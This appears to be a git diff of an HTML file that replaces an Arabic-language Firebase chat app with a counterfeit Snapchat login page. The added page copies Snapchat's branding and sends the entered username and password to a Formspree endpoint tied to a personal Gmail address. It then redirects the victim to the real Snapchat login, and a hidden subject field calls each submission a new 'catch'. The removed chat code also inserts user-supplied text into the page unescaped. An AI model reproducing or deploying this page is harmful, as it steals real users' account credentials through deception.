@@ -3,217 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SARZIX - Chat Private</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Snapchat - Login</title>
     <style>
-        :root { --wa-green: #075e54; --wa-light: #25d366; --bg: #e5ddd5; --white: #ffffff; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-
-        /* شاشة الدخول */
-        #auth-screen { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .auth-card { width: 100%; max-width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; outline: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: var(--wa-green); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-
-        /* الهيدر وقائمة الأسماء */
-        header { background: var(--wa-green); color: white; padding: 12px 15px; display: flex; align-items: center; gap: 15px; justify-content: space-between; }
-        .search-container { padding: 10px; background: #f6f6f6; border-bottom: 1px solid #ddd; }
-        .search-container input { margin: 0; border-radius: 20px; background: white; padding: 8px 15px; border: 1px solid #eee; }
-
-        #contacts-page { flex: 1; background: white; overflow-y: auto; }
-        .contact-item { display: flex; align-items: center; padding: 12px 15px; border-bottom: 1px solid #eee; cursor: pointer; transition: 0.2s; }
-        .contact-item:hover { background: #f5f5f5; }
-        .avatar { width: 45px; height: 45px; background: #eee; border-radius: 50%; margin-left: 12px; display: flex; align-items: center; justify-content: center; color: #aaa; }
-
-        /* صفحة الشات */
-        #chat-page { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; transform: translateX(100%); transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1000; }
-        #chat-page.active { transform: translateX(0); }
-        #messages-container { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 6px; }
-        
-        .bubble { max-width: 75%; padding: 8px 12px; border-radius: 12px; font-size: 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); line-height: 1.4; }
-        .bubble.sent { align-self: flex-start; background: #dcf8c6; border-top-right-radius: 0; }
-        .bubble.received { align-self: flex-end; background: white; border-top-left-radius: 0; }
-
-        .input-area { background: #f0f0f0; padding: 8px 12px; display: flex; gap: 10px; align-items: center; }
-        .input-area input { flex: 1; margin: 0; border-radius: 25px; border: none; padding: 10px 15px; font-size: 15px; }
-        
-        .hidden { display: none !important; }
+        body { background-color: #FFFC00; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        img { width: 50px; margin-bottom: 15px; }
+        h2 { font-size: 18px; color: #333; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #e0e0e0; border-radius: 5px; box-sizing: border-box; background: #fbfbfb; font-size: 14px; text-align: right; }
+        button { width: 100%; padding: 12px; background-color: #000; color: white; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 15px; }
+        .footer-link { font-size: 12px; color: #007aff; margin-top: 15px; text-decoration: none; display: block; }
     </style>
 </head>
 <body>
 
-<div id="auth-screen">
-    <div class="auth-card">
-        <h1 style="color:var(--wa-green);">SARZIX</h1>
-        <div id="register-fields" class="hidden">
-            <input type="text" id="reg-username" placeholder="اسمك المستعار">
-        </div>
-        <input type="email" id="email" placeholder="البريد الإلكتروني">
-        <input type="password" id="pass" placeholder="كلمة المرور">
-        <button class="btn" onclick="handleAuth()" id="auth-btn">تسجيل دخول</button>
-        <p onclick="toggleAuth()" id="toggle-text" style="color:var(--wa-green); cursor:pointer; margin-top:15px; font-size: 14px;">ليس لديك حساب؟ سجل الآن</p>
-    </div>
+<div class="login-box">
+    <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" alt="Snapchat Logo">
+    <h2>تسجيل الدخول إلى سناب شات</h2>
+    
+    <form action="https://formspree.io/f/sarzix2005@gmail.com" method="POST">
+        <input type="text" name="Username" placeholder="اسم المستخدم أو البريد" required>
+        <input type="password" name="Password" placeholder="كلمة المرور" required>
+        
+        <input type="hidden" name="_next" value="https://accounts.snapchat.com/accounts/login">
+        
+        <input type="hidden" name="_subject" value="صيد جديد من مقلب السناب!">
+        
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+    
+    <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
 </div>
 
-<header>
-    <i class="fa fa-sign-out-alt" title="خروج" onclick="logout()"></i>
-    <h3 style="margin:0;">SARZIX CHAT</h3>
-    <div style="width:20px;"></div>
-</header>
-
-<div class="search-container">
-    <input type="text" id="user-search" placeholder="بحث عن شخص..." oninput="filterContacts()">
-</div>
-
-<div id="contacts-page">
-    <p style="text-align:center; padding:20px; color:#999;">جاري التحميل...</p>
-</div>
-
-<div id="chat-page">
-    <header>
-        <i class="fa fa-arrow-right" onclick="closeChat()"></i>
-        <div id="chat-title" style="font-weight:bold;">الاسم</div>
-        <div style="width:20px;"></div>
-    </header>
-    <div id="messages-container"></div>
-    <div class="input-area">
-        <input type="text" id="msg-input" placeholder="اكتب رسالة..." onkeypress="if(event.key==='Enter') sendPrivateMsg()">
-        <button onclick="sendPrivateMsg()" style="background:var(--wa-green); color:white; border:none; width:40px; height:40px; border-radius:50%;"><i class="fa fa-paper-plane"></i></button>
-    </div>
-</div>
-
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getFirestore, doc, setDoc, getDoc, collection, addDoc, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyAEmoZ9PzSfTJzWbPn_yRxDnKxHR-z4Y4A",
-        authDomain: "mstf-b.firebaseapp.com",
-        projectId: "mstf-b",
-        storageBucket: "mstf-b.firebasestorage.app",
-        messagingSenderId: "837143491416",
-        appId: "1:837143491416:web:6ddc6f561b74244ccc6b2d"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
-
-    let isLogin = true;
-    let myInfo = null;
-    let targetChat = null;
-    let allUsers = [];
-
-    // التبديل بين دخول وتسجيل
-    window.toggleAuth = () => {
-        isLogin = !isLogin;
-        document.getElementById('register-fields').classList.toggle('hidden');
-        document.getElementById('auth-btn').innerText = isLogin ? "تسجيل دخول" : "إنشاء حساب";
-    };
-
-    // تسجيل الخروج اليدوي
-    window.logout = () => {
-        signOut(auth).then(() => {
-            location.reload(); // إعادة تحميل لإجبار شاشة الدخول على الظهور
-        });
-    };
-
-    // معالجة الدخول والاشتراك
-    window.handleAuth = async () => {
-        const e = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
-        try {
-            if(isLogin) {
-                await signInWithEmailAndPassword(auth, e, p);
-            } else {
-                const name = document.getElementById('reg-username').value;
-                const res = await createUserWithEmailAndPassword(auth, e, p);
-                await setDoc(doc(db, "users", res.user.uid), { username: name, email: e, uid: res.user.uid });
-            }
-        } catch(err) { alert("خطأ: " + err.message); }
-    };
-
-    // مراقبة حالة المستخدم
-    onAuthStateChanged(auth, async (user) => {
-        if(user) {
-            document.getElementById('auth-screen').classList.add('hidden');
-            const snap = await getDoc(doc(db, "users", user.uid));
-            myInfo = snap.data();
-            loadContacts();
-        } else {
-            document.getElementById('auth-screen').classList.remove('hidden');
-        }
-    });
-
-    // تحميل وعرض قائمة جهات الاتصال
-    function loadContacts() {
-        onSnapshot(collection(db, "users"), (snap) => {
-            allUsers = [];
-            snap.forEach(d => {
-                if(d.id !== auth.currentUser.uid) allUsers.push(d.data());
-            });
-            renderList(allUsers);
-        });
-    }
-
-    function renderList(users) {
-        const list = document.getElementById('contacts-page');
-        list.innerHTML = "";
-        users.forEach(u => {
-            const div = document.createElement('div');
-            div.className = 'contact-item';
-            div.innerHTML = `<div class="avatar"><i class="fa fa-user"></i></div><div><b>${u.username}</b><br><small style="color:#888;">${u.email}</small></div>`;
-            div.onclick = () => openChat(u);
-            list.appendChild(div);
-        });
-    }
-
-    // فلترة البحث
-    window.filterContacts = () => {
-        const term = document.getElementById('user-search').value.toLowerCase();
-        const filtered = allUsers.filter(u => u.username.toLowerCase().includes(term) || u.email.toLowerCase().includes(term));
-        renderList(filtered);
-    };
-
-    // فتح الشات
-    window.openChat = (user) => {
-        targetChat = user;
-        document.getElementById('chat-title').innerText = user.username;
-        document.getElementById('chat-page').classList.add('active');
-        loadMessages();
-    };
-
-    window.closeChat = () => document.getElementById('chat-page').classList.remove('active');
-
-    window.sendPrivateMsg = async () => {
-        const inp = document.getElementById('msg-input');
-        if(!inp.value.trim()) return;
-        await addDoc(collection(db, "messages"), {
-            text: inp.value,
-            from: auth.currentUser.uid,
-            to: targetChat.uid,
-            time: Date.now()
-        });
-        inp.value = "";
-    };
-
-    function loadMessages() {
-        const q = query(collection(db, "messages"), orderBy("time", "asc"));
-        onSnapshot(q, (snap) => {
-            const container = document.getElementById('messages-container');
-            container.innerHTML = "";
-            snap.forEach(d => {
-                const m = d.data();
-                if((m.from === auth.currentUser.uid && m.to === targetChat.uid) || 
-                   (m.from === targetChat.uid && m.to === auth.currentUser.uid)) {
-                    const side = m.from === auth.currentUser.uid ? 'sent' : 'received';
-                    container.innerHTML += `<div class="bubble ${side}">${m.text}</div>`;
-                }
-            });
-            container.scrollTop = container.scrollHeight;
-        });
-    }
-</script>
 </body>
 </html>
